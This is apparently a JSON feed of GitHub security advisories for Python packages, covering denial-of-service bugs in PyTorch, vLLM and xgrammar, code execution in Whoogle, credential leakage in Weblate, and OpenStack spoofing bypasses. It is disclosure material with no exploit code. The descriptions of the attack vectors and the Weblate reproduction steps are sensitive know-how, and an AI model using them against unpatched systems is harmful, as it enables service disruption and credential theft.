{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3730\">https://nvd.nist.gov/vuln/detail/CVE-2025-3730</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/issues/150835\">https://github.com/pytorch/pytorch/issues/150835</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/pull/150981\">https://github.com/pytorch/pytorch/pull/150981</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.305076\">https://vuldb.com/?ctiid.305076</a></li>\n<li><a href=\"https://vuldb.com/?id.305076\">https://vuldb.com/?id.305076</a></li>\n<li><a href=\"https://vuldb.com/?submit.553645\">https://vuldb.com/?submit.553645</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af\">https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-887c-mr87-cxwp\">https://github.com/advisories/GHSA-887c-mr87-cxwp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-887c-mr87-cxwp",
            "title": "[torch] PyTorch Improper Resource Shutdown or Release vulnerability",
            "date_modified": "2025-04-16T21:55:38.000Z",
            "date_published": "2025-04-16T21:30:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-887c-mr87-cxwp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in the component /models/config.py of Whoogle search v0.9.0 allows attackers to execute arbitrary code via supplying a crafted search query.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53305\">https://nvd.nist.gov/vuln/detail/CVE-2024-53305</a></li>\n<li><a href=\"https://github.com/benbusby/whoogle-search/commit/223f00c3c0533423114f99b30c561278bc0b42ba\">https://github.com/benbusby/whoogle-search/commit/223f00c3c0533423114f99b30c561278bc0b42ba</a></li>\n<li><a href=\"https://gist.github.com/fern89/ca5fe76ad81b4bc363e7341e523a1651\">https://gist.github.com/fern89/ca5fe76ad81b4bc363e7341e523a1651</a></li>\n<li><a href=\"https://fern89.github.io/posts/whoogle-rce\">https://fern89.github.io/posts/whoogle-rce</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2689-cw26-6cpj\">https://github.com/advisories/GHSA-2689-cw26-6cpj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2689-cw26-6cpj",
            "title": "[whoogle-search] Whoogle allows attackers to execute arbitrary code via supplying a crafted search query",
            "date_modified": "2025-04-16T20:38:01.000Z",
            "date_published": "2025-04-16T18:31:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2689-cw26-6cpj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability, which was classified as problematic, has been found in PyTorch 2.6.0+cu124. Affected by this issue is the function torch.mkldnn_max_pool2d. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2953\">https://nvd.nist.gov/vuln/detail/CVE-2025-2953</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/issues/149274\">https://github.com/pytorch/pytorch/issues/149274</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/issues/149274#issue-2923122269\">https://github.com/pytorch/pytorch/issues/149274#issue-2923122269</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.302006\">https://vuldb.com/?ctiid.302006</a></li>\n<li><a href=\"https://vuldb.com/?id.302006\">https://vuldb.com/?id.302006</a></li>\n<li><a href=\"https://vuldb.com/?submit.521279\">https://vuldb.com/?submit.521279</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3749-ghw9-m3mg\">https://github.com/advisories/GHSA-3749-ghw9-m3mg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3749-ghw9-m3mg",
            "title": "[torch] PyTorch susceptible to local Denial of Service",
            "date_modified": "2025-04-15T21:24:27.000Z",
            "date_published": "2025-03-30T18:30:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3749-ghw9-m3mg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This report is to highlight a vulnerability in XGrammar, a library used by the structured output feature in vLLM. The XGrammar advisory is here: <a href=\"https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3\">https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3</a></p>\n<p>The <a href=\"https://xgrammar.mlc.ai/docs/\">xgrammar</a> library is the default backend used by vLLM to support structured output (a.k.a. guided decoding). Xgrammar provides a required, built-in cache for its compiled grammars stored in RAM. xgrammar is available by default through the OpenAI compatible API server with both the V0 and V1 engines.</p>\n<p>A malicious user can send a stream of very short decoding requests with unique schemas, resulting in an addition to the cache for each request. This can result in a Denial of Service by consuming all of the system's RAM.</p>\n<p>Note that even if vLLM was configured to use a different backend by default, it is still possible to choose xgrammar on a per-request basis using the <code>guided_decoding_backend</code> key of the <code>extra_body</code> field of the request with the V0 engine. This per-request choice is not available when using the V1 engine. </p>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/16283\">https://github.com/vllm-project/vllm/pull/16283</a></li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no way to workaround this issue in existing versions of vLLM other than preventing untrusted access to the OpenAI compatible API server.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3\">https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3\">https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-hf3c-wxg2-49q9\">https://github.com/vllm-project/vllm/security/advisories/GHSA-hf3c-wxg2-49q9</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/16283\">https://github.com/vllm-project/vllm/pull/16283</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/commit/cb84e45ac75b42ba6795145923e8eb323bb825ad\">https://github.com/vllm-project/vllm/commit/cb84e45ac75b42ba6795145923e8eb323bb825ad</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hf3c-wxg2-49q9\">https://github.com/advisories/GHSA-hf3c-wxg2-49q9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hf3c-wxg2-49q9",
            "title": "[vllm] vLLM vulnerable to Denial of Service by abusing xgrammar cache",
            "date_modified": "2025-04-15T21:21:06.000Z",
            "date_published": "2025-04-15T21:21:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hf3c-wxg2-49q9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When creating a new component from an existing component that has a source code repository URL specified in settings, this URL is included in the client's URL parameters during the creation process. If, for example, the source code repository URL contains GitHub credentials, the confidential PAT and username are shown in plaintext and get saved into browser history. Moreover, if the request URL is logged, the credentials are written to the logs in plaintext.</p>\n<p>The problematic URL in question is of this form:</p>\n<pre><code>https://&lt;HOST&gt;/create/component/vcs/?repo=https%3A%2F%2F&lt;GITHUB USERNAME&gt;%3A&lt;GITHUB PAT&gt;%40github.com%2F&lt;REPOSITORY OWNER&gt;%2F&lt;REPOSITORY NAME&gt;.git&amp;project=1&amp;category=&amp;name=&lt;REDACTED&gt;&amp;slug=&lt;REDACTED&gt;&amp;is_glossary=False&amp;vcs=github&amp;source_language=228&amp;license=&amp;source_component=1#existing\n</code></pre>\n<p>If using Weblate official Docker image, nginx logs the URL and the token in plaintext:</p>\n<pre><code>nginx stdout | 127.0.0.1 - - [04/Apr/2025:10:46:54 +0000] \"GET /create/component/vcs/?repo=https%3A%2F%2F&lt;GITHUB USERNAME&gt;%3A&lt;GITHUB PAT&gt;%40github.com%2F&lt;REPOSITORY OWNER&gt;%2F&lt;REPOSITORY NAME&gt;.git&amp;project=1&amp;category=&amp;name=&lt;REDACTED&gt;&amp;slug=&lt;REDACTED&gt;&amp;is_glossary=False&amp;vcs=github&amp;source_language=228&amp;license=&amp;source_component=1 HTTP/1.1\" 200 17625 \"&lt;REDACTED&gt;\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0\"\n</code></pre>\n<h3 id=\"reproduction\">Reproduction</h3>\n<ol>\n<li>In a project, create a component which has the <em>Repository push URL</em> setting configured with, for example, a GitHub repository URL including a username and a PAT.</li>\n<li>In the same project, create another component using the <em>From existing component</em> option and selecting the previous component as the source. Click <em>Continue</em>.</li>\n<li>Observe that the URL parameter <code>repo</code> includes the secret PAT configured in the original components settings. The URL with the token is potentially saved as plaintext in browser history and server logs.</li>\n<li>Select a translation file to import and click <em>Continue</em>.</li>\n<li>Observe again the same <code>repo</code> parameter in the URL.</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>If server logs are compromised, the attacker may be able to gain access to private repositories potentially containing sensitive source code.</li>\n<li>Under common browser settings, the URL containing VCS credentials is saved into browser history. Browser extensions, for example, are often able to read the history and thus offer a realistic attack vector to gain access to the credentials.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/WeblateOrg/weblate/security/advisories/GHSA-m67m-3p5g-cw9j\">https://github.com/WeblateOrg/weblate/security/advisories/GHSA-m67m-3p5g-cw9j</a></li>\n<li><a href=\"https://github.com/WeblateOrg/weblate/releases/tag/weblate-5.11\">https://github.com/WeblateOrg/weblate/releases/tag/weblate-5.11</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32021\">https://nvd.nist.gov/vuln/detail/CVE-2025-32021</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m67m-3p5g-cw9j\">https://github.com/advisories/GHSA-m67m-3p5g-cw9j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m67m-3p5g-cw9j",
            "title": "[weblate] VCS credentials included in URL parameters are potentially logged and saved into browser history as plaintext",
            "date_modified": "2025-04-15T21:42:21.000Z",
            "date_published": "2025-04-15T14:20:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m67m-3p5g-cw9j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The IPTables firewall in OpenStack Neutron before 7.0.4 and 8.0.0 through 8.1.0 allows remote attackers to bypass an intended DHCP-spoofing protection mechanism and consequently cause a denial of service or intercept network traffic via a crafted DHCP discovery message.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-5362\">https://nvd.nist.gov/vuln/detail/CVE-2016-5362</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2016:1473\">https://access.redhat.com/errata/RHSA-2016:1473</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2016:1474\">https://access.redhat.com/errata/RHSA-2016:1474</a></li>\n<li><a href=\"https://bugs.launchpad.net/neutron/+bug/1558658\">https://bugs.launchpad.net/neutron/+bug/1558658</a></li>\n<li><a href=\"https://security.openstack.org/ossa/OSSA-2016-009.html\">https://security.openstack.org/ossa/OSSA-2016-009.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/10/5\">http://www.openwall.com/lists/oss-security/2016/06/10/5</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/10/6\">http://www.openwall.com/lists/oss-security/2016/06/10/6</a></li>\n<li><a href=\"https://review.openstack.org/#/c/300202\">https://review.openstack.org/#/c/300202</a></li>\n<li><a href=\"https://review.openstack.org/#/c/303563\">https://review.openstack.org/#/c/303563</a></li>\n<li><a href=\"https://review.openstack.org/#/c/303572\">https://review.openstack.org/#/c/303572</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qpwc-p365-pqrr\">https://github.com/advisories/GHSA-qpwc-p365-pqrr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qpwc-p365-pqrr",
            "title": "[neutron] OpenStack Neutron allows remote attackers to bypass an intended DHCP-spoofing protection mechanism",
            "date_modified": "2025-04-14T21:05:49.000Z",
            "date_published": "2022-05-14T02:19:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qpwc-p365-pqrr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The IPTables firewall in OpenStack Neutron before 7.0.4 and 8.0.0 through 8.1.0 allows remote attackers to bypass an intended DHCP-spoofing protection mechanism and consequently cause a denial of service or intercept network traffic via a crafted DHCP discovery message.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-5362\">https://nvd.nist.gov/vuln/detail/CVE-2016-5362</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2016:1473\">https://access.redhat.com/errata/RHSA-2016:1473</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2016:1474\">https://access.redhat.com/errata/RHSA-2016:1474</a></li>\n<li><a href=\"https://bugs.launchpad.net/neutron/+bug/1558658\">https://bugs.launchpad.net/neutron/+bug/1558658</a></li>\n<li><a href=\"https://security.openstack.org/ossa/OSSA-2016-009.html\">https://security.openstack.org/ossa/OSSA-2016-009.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/10/5\">http://www.openwall.com/lists/oss-security/2016/06/10/5</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/10/6\">http://www.openwall.com/lists/oss-security/2016/06/10/6</a></li>\n<li><a href=\"https://review.openstack.org/#/c/300202\">https://review.openstack.org/#/c/300202</a></li>\n<li><a href=\"https://review.openstack.org/#/c/303563\">https://review.openstack.org/#/c/303563</a></li>\n<li><a href=\"https://review.openstack.org/#/c/303572\">https://review.openstack.org/#/c/303572</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qpwc-p365-pqrr\">https://github.com/advisories/GHSA-qpwc-p365-pqrr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qpwc-p365-pqrr",
            "title": "[neutron] OpenStack Neutron allows remote attackers to bypass an intended DHCP-spoofing protection mechanism",
            "date_modified": "2025-04-14T21:05:49.000Z",
            "date_published": "2022-05-14T02:19:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qpwc-p365-pqrr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The IPTables firewall in OpenStack Neutron before 7.0.4 and 8.0.0 through 8.1.0 allows remote attackers to bypass an intended ICMPv6-spoofing protection mechanism and consequently cause a denial of service or intercept network traffic via a link-local source address.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-8914\">https://nvd.nist.gov/vuln/detail/CVE-2015-8914</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2016:1473\">https://access.redhat.com/errata/RHSA-2016:1473</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2016:1474\">https://access.redhat.com/errata/RHSA-2016:1474</a></li>\n<li><a href=\"https://bugs.launchpad.net/neutron/+bug/1502933\">https://bugs.launchpad.net/neutron/+bug/1502933</a></li>\n<li><a href=\"https://security.openstack.org/ossa/OSSA-2016-009.html\">https://security.openstack.org/ossa/OSSA-2016-009.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/10/5\">http://www.openwall.com/lists/oss-security/2016/06/10/5</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/10/6\">http://www.openwall.com/lists/oss-security/2016/06/10/6</a></li>\n<li><a href=\"https://review.openstack.org/#/c/300233\">https://review.openstack.org/#/c/300233</a></li>\n<li><a href=\"https://review.openstack.org/#/c/310648\">https://review.openstack.org/#/c/310648</a></li>\n<li><a href=\"https://review.openstack.org/#/c/310652\">https://review.openstack.org/#/c/310652</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3vj4-cvjp-482h\">https://github.com/advisories/GHSA-3vj4-cvjp-482h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3vj4-cvjp-482h",
            "title": "[neutron] OpenStack Neutron allows remote attackers to bypass an intended ICMPv6-spoofing protection mechanism",
            "date_modified": "2025-04-14T21:03:47.000Z",
            "date_published": "2022-05-14T02:19:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3vj4-cvjp-482h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The IPTables firewall in OpenStack Neutron before 7.0.4 and 8.0.0 through 8.1.0 allows remote attackers to bypass an intended ICMPv6-spoofing protection mechanism and consequently cause a denial of service or intercept network traffic via a link-local source address.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-8914\">https://nvd.nist.gov/vuln/detail/CVE-2015-8914</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2016:1473\">https://access.redhat.com/errata/RHSA-2016:1473</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2016:1474\">https://access.redhat.com/errata/RHSA-2016:1474</a></li>\n<li><a href=\"https://bugs.launchpad.net/neutron/+bug/1502933\">https://bugs.launchpad.net/neutron/+bug/1502933</a></li>\n<li><a href=\"https://security.openstack.org/ossa/OSSA-2016-009.html\">https://security.openstack.org/ossa/OSSA-2016-009.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/10/5\">http://www.openwall.com/lists/oss-security/2016/06/10/5</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/06/10/6\">http://www.openwall.com/lists/oss-security/2016/06/10/6</a></li>\n<li><a href=\"https://review.openstack.org/#/c/300233\">https://review.openstack.org/#/c/300233</a></li>\n<li><a href=\"https://review.openstack.org/#/c/310648\">https://review.openstack.org/#/c/310648</a></li>\n<li><a href=\"https://review.openstack.org/#/c/310652\">https://review.openstack.org/#/c/310652</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3vj4-cvjp-482h\">https://github.com/advisories/GHSA-3vj4-cvjp-482h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3vj4-cvjp-482h",
            "title": "[neutron] OpenStack Neutron allows remote attackers to bypass an intended ICMPv6-spoofing protection mechanism",
            "date_modified": "2025-04-14T21:03:47.000Z",
            "date_published": "2022-05-14T02:19:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3vj4-cvjp-482h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>jupyter-remote-desktop-proxy</code> was meant to rely on UNIX sockets readable only by the current user since version 3.0.0, but when used with TigerVNC, the VNC server started by <code>jupyter-remote-desktop-proxy</code> were still accessible via the network.</p>\n<p>This vulnerability does not affect users having TurboVNC as the <code>vncserver</code> executable.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>This vulnerability was identified by Arne Gottwald at University of Göttingen and analyzed, reported, and reviewed by @frejanordsiek.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyter-remote-desktop-proxy/security/advisories/GHSA-vrq4-9hc3-cgp7\">https://github.com/jupyterhub/jupyter-remote-desktop-proxy/security/advisories/GHSA-vrq4-9hc3-cgp7</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-remote-desktop-proxy/commit/7dd54c25a4253badd8ea68895437e5a66a59090d\">https://github.com/jupyterhub/jupyter-remote-desktop-proxy/commit/7dd54c25a4253badd8ea68895437e5a66a59090d</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32428\">https://nvd.nist.gov/vuln/detail/CVE-2025-32428</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vrq4-9hc3-cgp7\">https://github.com/advisories/GHSA-vrq4-9hc3-cgp7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vrq4-9hc3-cgp7",
            "title": "[jupyter-remote-desktop-proxy] TigerVNC accessible via the network and not just via a UNIX socket as intended",
            "date_modified": "2025-04-15T12:49:07.000Z",
            "date_published": "2025-04-12T03:42:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vrq4-9hc3-cgp7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenStack Compute (Nova) Folsom, Grizzly, and Havana does not verify the virtual size of a QCOW2 image, which allows local users to cause a denial of service (host file system disk consumption) by creating an image with a large virtual size that does not contain a large amount of data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2013-2096\">https://nvd.nist.gov/vuln/detail/CVE-2013-2096</a></li>\n<li><a href=\"http://lists.openstack.org/pipermail/openstack-announce/2013-May/000102.html\">http://lists.openstack.org/pipermail/openstack-announce/2013-May/000102.html</a></li>\n<li><a href=\"http://www.ubuntu.com/usn/USN-1831-1\">http://www.ubuntu.com/usn/USN-1831-1</a></li>\n<li><a href=\"https://review.openstack.org/#/c/28717\">https://review.openstack.org/#/c/28717</a></li>\n<li><a href=\"https://review.openstack.org/#/c/28901\">https://review.openstack.org/#/c/28901</a></li>\n<li><a href=\"https://review.openstack.org/#/c/29192\">https://review.openstack.org/#/c/29192</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/0caeb8eaf20abcdc77828f5c6b79fc104619e231\">https://github.com/openstack/nova/commit/0caeb8eaf20abcdc77828f5c6b79fc104619e231</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/44a8aba1d5da87d54db48079103fdef946666d80\">https://github.com/openstack/nova/commit/44a8aba1d5da87d54db48079103fdef946666d80</a></li>\n<li><a href=\"https://web.archive.org/web/20130726040108/http://www.securityfocus.com/bid/59924\">https://web.archive.org/web/20130726040108/http://www.securityfocus.com/bid/59924</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m674-hmx2-ffhq\">https://github.com/advisories/GHSA-m674-hmx2-ffhq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m674-hmx2-ffhq",
            "title": "[nova] OpenStack Compute (Nova) does not verify the virtual size of a QCOW2 image",
            "date_modified": "2025-04-12T03:16:19.000Z",
            "date_published": "2022-05-17T04:55:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m674-hmx2-ffhq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"withdrawn-advisory\">Withdrawn Advisory</h2>\n<p>This advisory has been withdrawn because the vendor's position is that authentication is intentionally not implemented because the product is not intended for an untrusted network environment. Use cases requiring authentication could, for example, use a reverse proxy server.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Mobile Security Framework (MobSF) &lt;=v3.7.8 Beta is vulnerable to Insecure Permissions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-42261\">https://nvd.nist.gov/vuln/detail/CVE-2023-42261</a></li>\n<li><a href=\"https://github.com/woshinibaba222/hack16/blob/main/Unauthorized%20Access%20to%20MobSF.md\">https://github.com/woshinibaba222/hack16/blob/main/Unauthorized%20Access%20to%20MobSF.md</a></li>\n<li><a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/1211\">https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/1211</a></li>\n<li><a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/748\">https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/748</a></li>\n<li><a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/abb47659a19ac772765934f184c65fe16cb3bee7/docker-compose.yml#L30-L31\">https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/abb47659a19ac772765934f184c65fe16cb3bee7/docker-compose.yml#L30-L31</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/mobsf/PYSEC-2023-310.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/mobsf/PYSEC-2023-310.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cc8j-6phr-jv9x\">https://github.com/advisories/GHSA-cc8j-6phr-jv9x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cc8j-6phr-jv9x",
            "title": "[mobsf] Withdrawn Advisory: Mobile Security Framework (MobSF) Vulnerable to Insecure Permissions",
            "date_modified": "2025-04-10T14:29:58.000Z",
            "date_published": "2023-09-22T00:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cc8j-6phr-jv9x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the cleo PyPI package, when an attacker is able to supply arbitrary input to the Table.set_rows method.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-42966\">https://nvd.nist.gov/vuln/detail/CVE-2022-42966</a></li>\n<li><a href=\"https://research.jfrog.com/vulnerabilities/cleo-redos-xray-257186\">https://research.jfrog.com/vulnerabilities/cleo-redos-xray-257186</a></li>\n<li><a href=\"https://github.com/python-poetry/cleo/pull/285\">https://github.com/python-poetry/cleo/pull/285</a></li>\n<li><a href=\"https://github.com/python-poetry/cleo/commit/b5b9a04d2caf58bf7cf94eb7ae4a1ebbe60ea455\">https://github.com/python-poetry/cleo/commit/b5b9a04d2caf58bf7cf94eb7ae4a1ebbe60ea455</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/cleo/PYSEC-2022-43178.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/cleo/PYSEC-2022-43178.yaml</a></li>\n<li><a href=\"https://github.com/python-poetry/cleo/releases/tag/2.0.0\">https://github.com/python-poetry/cleo/releases/tag/2.0.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2p9h-ccw7-33gf\">https://github.com/advisories/GHSA-2p9h-ccw7-33gf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2p9h-ccw7-33gf",
            "title": "[cleo] cleo is vulnerable to Regular Expression Denial of Service (ReDoS)",
            "date_modified": "2025-04-10T13:28:38.000Z",
            "date_published": "2022-11-10T12:01:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2p9h-ccw7-33gf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Xgrammar includes a cache for compiled grammars to increase performance with repeated use of the same grammar. This cache is held in memory. Since the cache is unbounded, a system making use of xgrammar can be abused to fill up a host's memory and case a denial of service. For example, sending many small requests to an LLM inference server with unique JSON schemas would eventually cause this denial of service to occur.</p>\n<h3 id=\"details\">Details</h3>\n<p>The fix is to add a limit to the cache size. This was done in <a href=\"https://github.com/mlc-ai/xgrammar/pull/243\">https://github.com/mlc-ai/xgrammar/pull/243</a></p>\n<p>An example of making use of the new cache size limit can be found in vLLM here: <a href=\"https://github.com/vllm-project/vllm/pull/16283\">https://github.com/vllm-project/vllm/pull/16283</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Any system making use of Xgrammar and taking requests as input from potentially untrusted parties would be vulnerable to this denial of service issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3\">https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3</a></li>\n<li><a href=\"https://github.com/mlc-ai/xgrammar/pull/243\">https://github.com/mlc-ai/xgrammar/pull/243</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32381\">https://nvd.nist.gov/vuln/detail/CVE-2025-32381</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/16283\">https://github.com/vllm-project/vllm/pull/16283</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-389x-67px-mjg3\">https://github.com/advisories/GHSA-389x-67px-mjg3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-389x-67px-mjg3",
            "title": "[xgrammar] xgrammar Vulnerable to Denial of Service (DoS) by abusing unbounded cache in memory",
            "date_modified": "2025-04-09T19:54:01.000Z",
            "date_published": "2025-04-09T13:08:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-389x-67px-mjg3"
            },
